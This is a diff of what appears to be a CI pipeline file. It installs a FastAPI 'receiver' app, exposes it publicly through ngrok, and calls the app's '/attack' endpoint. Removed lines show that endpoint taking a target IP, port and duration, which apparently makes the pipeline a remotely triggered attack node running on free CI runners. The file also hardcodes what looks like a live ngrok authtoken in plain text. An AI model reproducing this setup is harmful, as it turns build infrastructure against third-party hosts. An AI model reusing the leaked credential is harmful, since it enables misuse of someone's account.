@@ -6,33 +6,28 @@ python:
 services:
   - docker
 
+# Before running installation
 before_install:
-  - echo "Upgrading pip, setuptools, and wheel..."
-  - pip install --upgrade pip setuptools wheel
-  - echo "Installing docker-compose..."
-  - pip install "docker-compose<2"
+  - echo "Updating and Installing Dependencies"
+  - pip install --upgrade pip setuptools
+  - pip install fastapi uvicorn python-dotenv
   - echo "Setting up ngrok authtoken"
   - ./ngrok authtoken 2q9H7CNHNUuA6j9uMcbu8pVn7Dl_686qFSgBR7uQeVSULAvkZ
 
 install:
-  - echo "Installing Python dependencies..."
+  - echo "Installing dependencies from requirements.txt"
   - pip install -r requirements.txt
 
 script:
-  - echo "Building and running the receiver instance..."
-  - docker build -t receiver .  # Updated to `receiver`
-  - docker run -d -p 8000:8000 --name receiver receiver || { echo "Docker container failed to start"; exit 1; }
+  - echo "Running FastAPI application locally"
+  - uvicorn receiver:app --reload --host 0.0.0.0 --port 8000 &
+  - sleep 10  # Wait for FastAPI to start
 
-  # Start ngrok and retrieve the public URL
-  - echo "Starting ngrok..."
+  # Use ngrok to expose the FastAPI service
   - ./ngrok http 8000 &
-  - sleep 5  # Wait for ngrok to initialize
+  - sleep 10  # Ensure ngrok establishes the connection
   - export RECEIVER_NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
 
-  # Test the endpoint using the ngrok URL
-  - echo "Ngrok URL for testing: $RECEIVER_NGROK_URL"
-  - curl -X POST "$RECEIVER_NGROK_URL/attack" -H "Content-Type: application/json" -d '{"ip":"127.0.0.1","port":8080,"duration":60}' || { echo "API test failed"; exit 1; }
-
 after_success:
-  - echo "Pipeline executed successfully"
-  - echo "Ngrok URL for testing: $RECEIVER_NGROK_URL"
+  - echo "Ngrok URL for this account: $RECEIVER_NGROK_URL"
+  - curl $RECEIVER_NGROK_URL/attack
